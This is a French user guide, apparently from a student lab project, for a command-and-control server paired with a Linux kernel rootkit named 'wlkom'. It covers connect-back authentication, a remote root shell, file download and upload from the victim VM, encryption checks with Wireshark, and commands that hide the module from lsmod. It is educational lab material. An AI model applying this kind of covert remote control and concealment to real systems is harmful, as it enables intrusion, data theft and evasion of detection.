    Utiliser le C2¶

    Pourquoi ces choix ?

    Voir Connexion et Exécution.

    Le programme C2 (Command & Control) tourne sur la VM Attaquante. Il écoute sur un port TCP, attend qu'un rootkit se connecte, l'authentifie, puis offre un shell interactif pour exécuter des commandes à distance sur la VM Victime.

    Prérequis¶

    Depuis la machine hôte, copier les sources dans vmshare :

    cp -r attacking_program/ vmshare/

    Se connecter à la VM Attaquante :

    ssh -p 10023 epita@localhost

    Lancer le C2¶

    make run compile le binaire si nécessaire et le lance :

    cd /mnt/vmshare/attacking_program
make run

    Sortie :

    ./c2 4444
C2 listening on port 4444
[?] Waiting for rootkit connection...

    Le C2 attend maintenant qu'un rootkit se connecte.

    Connexion et authentification¶

    Quand le module se charge sur la VM Victime (voir Déployer le rootkit), le C2 affiche la connexion puis demande le mot de passe :

    [+] Rootkit connected from 192.168.100.20
WLKOM password:

    Entrez le mot de passe choisi lors du déploiement. Si le mot de passe est correct :

    [+] AUTH sent
[+] Authentication accepted

=== WLKOM INTERACTIVE SHELL ===
Type your command and press Enter. Type 'exit' to quit.

c2_shell>

    Exécuter des commandes¶

    Tapez n'importe quelle commande shell après le prompt c2_shell>, et exit pour quitter :

    uname -a

    [Exit Status: 0]
--- STDOUT ---
Linux epita-victim 6.1.0-48-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.120-1 x86_64 GNU/Linux

--- STDERR ---

--- End of Output ---

    whoami

    [Exit Status: 0]
--- STDOUT ---
root

--- STDERR ---

--- End of Output ---

    ls /nonexistent

    [Exit Status: 2]
--- STDOUT ---

--- STDERR ---
ls: cannot access '/nonexistent': No such file or directory

--- End of Output ---

    La réponse contient toujours :

    • L'exit status (0 = succès, autre valeur = erreur)
    • La sortie standard (STDOUT)
    • La sortie d'erreur (STDERR)

    Transferts de fichiers¶

    Le C2 prend également en charge deux commandes dédiées au transfert de fichiers.

    Prérequis : les fichiers source doivent exister avant de lancer les commandes. Créez-les d'abord :

    Sur la VM Victime (pour un DOWNLOAD) : 

    echo "contenu test" > /home/epita/test.txt

    Sur la VM Attaquante (pour un UPLOAD) : 

    echo "contenu local" > /home/epita/local.txt

    DOWNLOAD <remote_path> <local_path> : récupère un fichier depuis la victime vers l'attaquant. À lancer depuis le c2_shell sur la VM Attaquante :

    DOWNLOAD /home/epita/test.txt /home/epita/from_victim.txt

    UPLOAD <local_path> <remote_path> : envoie un fichier depuis l'attaquant vers la victime. À lancer depuis le c2_shell sur la VM Attaquante :

    UPLOAD /home/epita/local.txt /tmp/remote.txt

    Les transferts utilisent la même voie chiffrée que les commandes shell. Le C2 attend un SIZE ... puis les octets du fichier pour DOWNLOAD, ou un UPLOAD_READY suivi des octets du fichier pour UPLOAD.

    Tester le chiffrement avec Wireshark¶

    Pour vérifier que les commandes C2 ne passent pas en clair sur le réseau, capturez le trafic TCP sur le port 4444 depuis la VM Attaquante, puis ouvrez la capture sur la machine hôte avec Wireshark.

    Le C2 doit être en cours d'utilisation pendant la capture : lancez quelques commandes dans le shell C2, par exemple whoami, uname -a ou un transfert de fichier.

    Depuis la machine hôte, ouvrez une seconde session SSH vers la VM Attaquante :

    ssh -p 10023 epita@localhost

    Sur la VM Attaquante, lancez tcpdump sur l'interface vmnet :

    sudo tcpdump -i vmnet -w c2_capture.pcap "tcp port 4444"

    Laissez la capture tourner pendant quelques échanges C2, puis arrêtez-la avec Ctrl+C. La sortie ressemble à ceci :

    tcpdump: listening on vmnet, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C10 packets captured
10 packets received by filter
0 packets dropped by kernel

    Copiez ensuite la capture dans le dossier partagé :

    ls
mv c2_capture.pcap /mnt/vmshare/

    De retour sur la machine hôte, ouvrez vmshare/c2_capture.pcap avec Wireshark. Utilisez Follow TCP Stream sur le flux tcp.port == 4444 : les adresses IP et les ports restent visibles, mais le contenu applicatif doit apparaître chiffré. Les chaînes comme AUTH, whoami, uname, STDOUT, STDERR ou les sorties de commandes ne doivent pas apparaître en clair dans le flux.

    Commandes de contrôle du module¶

    Le module se cache automatiquement dans lsmod dès son chargement. Trois commandes internes permettent ensuite de contrôler cette visibilité depuis le C2 :

    module_status : Indique si le module est visible ou caché 

    module_status

    hide_module : Retire le module de la liste lsmod 

    hide_module

    unhide_module : Réinsère le module dans la liste 

    unhide_module

    lsmod | grep wlkom : Vérifie la présence du module dans la liste 

    lsmod | grep wlkom

    Exemple complet avec vérification via lsmod 
    c2_shell> module_status
[Exit Status: 0]
--- STDOUT ---
wlkom: module hidden from lsmod
--- STDERR ---
--- End of Output ---

c2_shell> lsmod | grep wlkom
[Exit Status: 1]
--- STDOUT ---
--- STDERR ---
--- End of Output ---

c2_shell> unhide_module
[Exit Status: 0]
--- STDOUT ---
wlkom: module visible in lsmod
--- STDERR ---
--- End of Output ---

c2_shell> lsmod | grep wlkom
[Exit Status: 0]
--- STDOUT ---
wlkom                  16384  0
--- STDERR ---
--- End of Output ---

c2_shell> hide_module
[Exit Status: 0]
--- STDOUT ---
wlkom: module hidden from lsmod
--- STDERR ---
--- End of Output ---

c2_shell> lsmod | grep wlkom
[Exit Status: 1]
--- STDOUT ---
--- STDERR ---
--- End of Output ---

    Comportement si le mot de passe est incorrect¶

    Si le mot de passe saisi ne correspond pas à celui utilisé lors du déploiement du rootkit, l'authentification échoue :

    [-] Authentication failed: invalid password or connection lost
[?] Waiting for rootkit connection...

    Le module ferme la connexion et retente automatiquement, le C2 attend la prochaine connexion. À la reconnexion, le C2 redemande WLKOM password:.

    Comportement si le C2 est coupé¶

    Faites Ctrl+C pour couper le C2, puis relancez-le :

    cd /mnt/vmshare/attacking_program
make run

    Le rootkit se reconnecte automatiquement sans intervention côté victime. Le C2 redemande le mot de passe à la reconnexion.

    Vérification

    • make run affiche C2 listening on port 4444
    • Après chargement du module sur la victime : [+] Rootkit connected from 192.168.100.20
    • Après saisie du bon mot de passe : [+] Authentication accepted et prompt c2_shell>
    • uname -a dans le shell C2 retourne les infos de la VM Victime
    • Un mauvais mot de passe affiche Authentication failed
    • Après Ctrl+C + relance : le rootkit se reconnecte automatiquement et le mot de passe est à nouveau demandé
    • module_status retourne l'état de visibilité du module
    • hide_module puis lsmod | grep wlkom ne retourne rien
    • unhide_module puis lsmod | grep wlkom retourne le module
    • vmshare/c2_capture.pcap s'ouvre dans Wireshark et le flux TCP 4444 ne montre pas les commandes ni les sorties en clair
